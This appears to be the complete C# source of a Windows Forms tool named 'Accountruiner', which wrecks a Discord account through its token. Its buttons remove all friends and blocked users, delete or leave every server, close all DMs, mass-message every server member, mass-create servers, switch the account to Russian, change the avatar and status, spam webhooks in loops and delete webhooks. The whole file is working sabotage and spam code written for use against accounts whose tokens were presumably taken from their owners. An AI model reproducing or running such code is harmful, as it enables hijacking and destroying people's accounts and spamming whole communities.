using System;
using System.Drawing;
using System.Windows.Forms;
using System.Collections.Specialized;
using Discord;
using Discord.Gateway;
using System.Net;
using Newtonsoft.Json;
using System.IO;
using System.Text;

namespace Accountruiner
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        #region form stuff
        [Obsolete]
        public Form1()
        {
            InitializeComponent();
            this.StyleManager = metroStyleManager1;
        }
        
        //epic close button
        private void label1_Click(object sender, EventArgs e)
        {
            try
            {
                Application.Exit();
            }
            catch { }
        }

        private void label1_MouseEnter(object sender, EventArgs e)
        {
            try
            {
                esclbl.ForeColor = Color.FromArgb(192, 0, 192);
            }
            catch { }
        }

        private void label1_MouseLeave(object sender, EventArgs e)
        {
            try
            {
                esclbl.ForeColor = Color.White;
            }
            catch { }
        }

        //so you can move this shit
        protected override void OnMouseDown(MouseEventArgs e)
        {
            base.OnMouseDown(e);
            if (e.Button == MouseButtons.Left)
            {
                this.Capture = false;
                Message msg = Message.Create(this.Handle, 0XA1, new IntPtr(2), IntPtr.Zero);
                this.WndProc(ref msg);
            }
        }

        #endregion

        #region remove friends
        private void metroButton2_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (utoken.Text);

            DiscordClient client = new DiscordClient(token);

            try {
                foreach (var relationship in client.GetRelationships())
                {

                    if (relationship.Type == RelationshipType.Friends)
                    relationship.Remove();

                    if (relationship.Type == RelationshipType.IncomingRequest)
                    relationship.Remove();

                    if (relationship.Type == RelationshipType.OutgoingRequest)
                    relationship.Remove();

                    if (relationship.Type == RelationshipType.Blocked)
                    relationship.Remove();
                }
            }
            catch { }

        }
        #endregion

        #region remove guilds

        private void metroButton9_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }

            string token = (utoken.Text);

            DiscordClient client = new DiscordClient(token);

            try
            {
                foreach (var guild in client.GetGuilds())
                {
                    if (guild.Owner)
                        guild.Delete();

                    else
                        guild.Leave();

                    System.Threading.Thread.Sleep(100);

                }
            }
            catch { }
        }
        #endregion

        #region close dms
        private void metroButton13_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }

            string token = (utoken.Text);

            DiscordClient client = new DiscordClient(token);

            try
            {
                foreach (var dm in client.GetPrivateChannels())
                {
                    dm.Delete();
                }
            }
            catch { }
        }
        #endregion

        #region messageall
        private void metroButton12_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }

            string token = (utoken.Text);

            DiscordSocketClient client = new DiscordSocketClient();
            client.Login(token);

            try
            {
                foreach (var guild in client.GetCachedGuilds())
                {
                    foreach (var member in guild.GetMembers())
                    {
                        if (member.User.Id != client.User.Id)
                        {
                            client.CreateDM(member.User.Id);
                        }
                    }

                    foreach (var channel in client.GetPrivateChannels())
                    {
                        if (channel.Type == ChannelType.DM)
                        {
                            client.SendMessage(channel.Id, umsg.Text, false);
                        }
                    }
                }
            }
            catch{ }
        }
        #endregion

        #region massguild
        private void metroTrackBar2_Scroll(object sender, ScrollEventArgs e)
        {
            try
            {
                uguildsliderlbl.Text = uguildslider.Value.ToString();
            }
            catch { }
        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog fileSelect = new OpenFileDialog();
                if (fileSelect.ShowDialog() == DialogResult.OK)
                {
                    this.avatar = fileSelect.FileName;
                }
            }
            catch { }
        }

        private string avatar = "";

        private void metroButton11_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }

            string guildname = uguildname.Text;

            int repeat = uguildslider.Value;

            string token = (utoken.Text);

            DiscordClient client = new DiscordClient(token);

            if (avatar == "")
            {
                MessageBox.Show("please select an icon first");
                return;
            }

            if (uguildname.Text == "")
            {
                MessageBox.Show("please provide a guild name");
                return;
            }

            for (int i = 0; i < repeat; i++)
            {
                try
                {
                    client.CreateGuild(guildname, Image.FromFile(avatar), "russia");
                }
                catch { }
            }

        }
        #endregion

        #region lang
        private void metroButton18_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }

            string token = (utoken.Text);

            DiscordClient client = new DiscordClient(token);

            try
            {
                client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Russian });
            }
            catch { }
        }
        #endregion
        
        #region status
        private void metroButton16_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }

            string token = (utoken.Text);

            DiscordClient client = new DiscordClient(token);
            try
            {
                client.User.ChangeSettings(new UserSettingsProperties()
                {
                    CustomStatus = new CustomStatus() { Text = ustatus.Text }
                });
            }
            catch { }
        }
        #endregion

        #region avatar
        private void metroButton15_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileSelect = new OpenFileDialog();
            try
            {
                if (fileSelect.ShowDialog() == DialogResult.OK)
                {
                    this.profile = fileSelect.FileName;
                }
            }
            catch { }
        }

        private string profile = "";

        private void metroButton17_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }

            string token = (utoken.Text);

            DiscordClient client = new DiscordClient(token);

            if (profile == "")
            {
                MessageBox.Show("please select an image");
                return;
            }
            else
            {
                client.User.ChangeProfile(new UserProfileUpdate() { Avatar = Image.FromFile(profile) });
            }
        }
        #endregion

        #region normalwebhook
        class Http
        {
            public static byte[] Post(string uri, NameValueCollection pairs)
            {
                using (WebClient webClient = new WebClient())
                    return webClient.UploadValues(uri, pairs);
            }
        }
        
        public static void sendWebHook(string URL, string msg, string avatar, string username)
        {
            Http.Post(URL, new NameValueCollection()
            { 
                {
                    "username",
                    username
                },
                {
                    "avatar_url",
                     avatar
                },
                {
                    "content",
                     msg
                },
            });
        }

        private void metroTrackBar1_Scroll(object sender, ScrollEventArgs e)
        {
            whsliderlbl.Text = whslider.Value.ToString();
        }
        
        private void metroButton1_Click(object sender, EventArgs e)
        {
            try
            {
                int repeat = whslider.Value;
                for (int i = 0; i < repeat; i++)
                {
                    sendWebHook(whinput.Text, whmessage.Text, whavatar.Text, whname.Text);
                    System.Threading.Thread.Sleep(1000);
                }
            }
            catch{ }
        }
        #endregion

        #region embedwebhook
        private void metroButton4_Click(object sender, EventArgs e)
        {
            WebRequest wr = (HttpWebRequest)WebRequest.Create(whinput.Text);
            wr.ContentType = "application/json";
            wr.Method = "POST";

            using (var streamWriter = new StreamWriter(wr.GetRequestStream()))
            {
                string json = JsonConvert.SerializeObject(new
                {
                    username = whname.Text,
                    avatar_url = whavatar.Text,
                    embeds = new[]
                    {
                        new {
                            description = whdesc.Text,
                            title = wbtitle.Text,
                            color = "15794431",

                            author = new {
                                name = whauthor.Text,
                                url = "https://tayhay.gq",
                                icon_url = whavatar.Text,
                            },

                            footer = new {
                                icon_url = "",
                                text = whfooter.Text,
                            },
                        }
                    },
                });
                streamWriter.Write(json);
            }

            var response = (HttpWebResponse)wr.GetResponse();
        }
        #endregion

        #region checkiftoken
        private bool checkiftoken()
        {
            if (utoken.Text == "")
            {
                MessageBox.Show("please enter a token");
                return false;
            }
            return true;
        }
        #endregion

        #region delwebhook
        private void metroButton2_Click_1(object sender, EventArgs e)
        {
            deletewebhook();
        }

        public void deletewebhook()
        {
            try
            {
                string webhookurl = whinput.Text;
                string UserAgent = whuseragent.Text;
                HttpWebRequest Req = (HttpWebRequest)WebRequest.Create(webhookurl);
                byte[] bytes = Encoding.ASCII.GetBytes("{}");
                Req.Method = "DELETE";
                Req.UserAgent = UserAgent;
                Req.ContentLength = (long)bytes.Length;
                using (Stream requestStream = Req.GetRequestStream())
                {
                    requestStream.Write(bytes, 0, bytes.Length);
                }
                HttpWebResponse httpWebResponse = (HttpWebResponse)Req.GetResponse();
            }
            catch
            { }
        }
        #endregion
    }
}
